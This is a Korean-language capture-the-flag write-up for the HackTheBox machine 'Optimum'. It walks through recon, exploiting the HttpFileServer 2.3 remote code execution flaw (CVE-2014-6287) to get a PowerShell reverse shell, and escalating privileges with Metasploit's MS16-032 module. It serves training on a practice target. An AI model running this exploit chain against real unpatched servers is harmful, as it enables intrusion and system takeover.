# Optimum - HackTheBox
## Recon
```bash
sudo nmap -p 80 -sC -sV -vv -oA optimum 10.10.10.8
```
<img width="1102" height="170" alt="image" src="https://github.com/user-attachments/assets/2af85a10-3f73-4f14-aa73-b2d6f4fe781f" />

- HTTP(80)

---
## HTTP
### banner grabbing
```bash
whatweb http://10.10.10.8

curl -IL http://10.10.10.8
```
<img width="1102" height="292" alt="image" src="https://github.com/user-attachments/assets/d669cd8d-9c7e-436b-b1da-604591aa38d2" />

### CVE-2014-6287
- `HttpFileServer 2.3`가 서버에서 실행되고 있는 중.
<img width="524" height="548" alt="image" src="https://github.com/user-attachments/assets/a5c70416-2e59-45ce-8a40-cabb49e1cc6e" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/CVE-2014-6287
- `search`파라미터에 `%00`를 포함해서 임의의 코드 실행이 가능해짐.
<img width="1156" height="128" alt="image" src="https://github.com/user-attachments/assets/7dc399fb-e5c7-4cc9-8f32-969bf093badb" />

<br>
<br>

- https://github.com/thepedroalves/HFS-2.3-RCE-Exploit
- 코드를 인코딩하여 전달하는 것을 확인.
<img width="959" height="281" alt="image" src="https://github.com/user-attachments/assets/1009a227-e7d0-46ae-82d8-ba163c984a7c" />

<br>
<br>

- `print`를 넣어서 url를 출력하도록 스크립트를 수정.
<img width="1102" height="489" alt="image" src="https://github.com/user-attachments/assets/cd19e656-7a64-4b8d-8572-066aedaa018a" />

<br>
<br>

- 스크립트를 실행하여 페이로드를 확인.
<img width="1102" height="94" alt="image" src="https://github.com/user-attachments/assets/f732512a-405e-4a19-80a5-ffb436ba35b8" />

<br>
<br>

- `burpsuite`로 페이로드를 수정.
<img width="773" height="305" alt="image" src="https://github.com/user-attachments/assets/115bfe1f-a922-4e09-985e-9c5d8307387c" />

<br>
<br>

- ping test 성공.
<img width="823" height="395" alt="image" src="https://github.com/user-attachments/assets/ababd572-3d1b-4a2d-be64-0e664854f8d6" />

<br>
<br>

- 원본 파일의 스크립트를 실행하여 출력(powershell reverse shell)
<img width="1102" height="304" alt="image" src="https://github.com/user-attachments/assets/f7ec17b4-4b45-4661-8a3d-e80b9b0d4609" />

<br>
<br>

- `burpsuite`로 페이로드 수정.
<img width="773" height="553" alt="image" src="https://github.com/user-attachments/assets/5ebe3c8a-d07e-43ec-b799-ff2a19f66001" />

<br>
<br>

- 셸 획득.
<img width="1105" height="142" alt="image" src="https://github.com/user-attachments/assets/eed59ae2-3f58-443e-a002-0ce63f1b84b8" />

---
## Privesc
- https://github.com/rasta-mouse/Sherlock
- `Sherlock.ps1`을 사용하여 windows 내의 취약점 확인.
```powershell
. .\sherlock.ps1

find-allvulns
```
<img width="1105" height="338" alt="image" src="https://github.com/user-attachments/assets/9617f637-db80-473d-82d6-6dbd8aa15cac" />

<br>
<br>

- `ms16-032` 취약점을 공략하였으나, 지속적으로 실패하여 `metasploit`을 이용.
```
msfconsole -q

search cve-2014-6287
```
<img width="1105" height="241" alt="image" src="https://github.com/user-attachments/assets/5ab79e85-2077-4b96-8ce0-be19dddc3c2a" />

<br>
<br>

- shell 획득.
```
set rhosts 10.10.10.8

set lhost 10.10.16.4

run

shell
```
<img width="1105" height="186" alt="image" src="https://github.com/user-attachments/assets/5c4320bc-c100-49e7-b1aa-4ed761b515db" />

<br>
<br>

- 해당 세션을 background로 실행해놓은 상태에서 `ms16-032`공격을 실행.
```
background

search ms16-032
```
<img width="1105" height="303" alt="image" src="https://github.com/user-attachments/assets/42942b10-631b-4db1-b271-1bf765b240e2" />

<br>
<br>

- 셸 획득.
```
set lhost tun0

set session 1

run

shell
```
<img width="1105" height="186" alt="image" src="https://github.com/user-attachments/assets/6b768a9c-014a-41cd-b94c-237dab3221f8" />

---
## FLAG
- `c:\users\kostas\desktop\user.txt`
<img width="1105" height="280" alt="image" src="https://github.com/user-attachments/assets/fc05fed1-4a23-45ef-b8c8-ae4b56c58cda" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1105" height="242" alt="image" src="https://github.com/user-attachments/assets/62ef2902-8bee-48ee-b493-7515b29a9f62" />
















